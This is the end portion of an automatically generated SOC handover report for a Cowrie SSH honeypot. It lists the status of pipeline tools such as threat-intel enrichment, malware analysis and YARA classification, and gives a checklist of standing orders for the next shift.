| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (17.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 24 recon entry/entries in table (2 group(s) consolidating 10 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-28T16:32:16Z_
